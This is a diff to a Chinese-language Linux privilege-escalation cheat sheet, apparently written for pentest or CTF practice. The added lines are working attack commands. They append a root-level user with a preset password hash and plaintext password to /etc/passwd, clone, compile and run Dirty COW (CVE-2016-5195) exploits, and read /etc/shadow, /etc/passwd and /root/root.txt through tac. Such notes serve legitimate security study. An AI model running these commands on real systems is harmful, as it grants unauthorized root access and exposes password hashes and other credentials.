@@ -100,10 +100,10 @@
 		
 - 可写入的/etc/passwd文件提权
 	- 查询写入权限：ls -al /etc/passwd
-	- 写入：echo 'Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash' >> /etc/passwd
-	- 密码为：Password@973
+	- 写入：``echo 'Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash' >> /etc/passwd``
+	- 密码为：``Password@973``
 	- su Tom
-	- mkpasswd -m des生成用户密码。
+	- linux生成用户密码：``mkpasswd -m sha-512``
 - 脏牛漏洞本地提权
 	- 内核版本低于列表里的版本(>=2.6.22)
 		::
@@ -122,6 +122,14 @@
 			git clone https://github.com/gbonacini/CVE-2016-5195.git
 			sudo apt-get install g++
 			make
+			
+			git clone https://github.com/FireFart/dirtycow
+			gcc -pthread dirty.c -o dirty -lcrypt
+			./dirty my-new-password
+			mv /tmp/passwd.bak /etc/passwd
+			
+			git clone https://github.com/dirtycow/dirtycow.github.io
+			gcc -pthread dirtyc0w.c -o dirty -lcrypt
 		
 - 内核漏洞利用
 	- 搜索特定系统和内核版本利用漏洞
@@ -423,6 +431,11 @@
 				tmux -S /opt/.tmux-0/sockets/default attach
 				
 			|tmux3|	
+			
+	- tac
+		+ tac -s 'RANDOM' "/etc/shadow"
+		+ tac -s 'RANDOM' "/etc/passwd"
+		+ tac -s 'RANDOM' "/root/root.txt"
 		
 - 其它
 	- https://github.com/SecWiki/linux-kernel-exploits
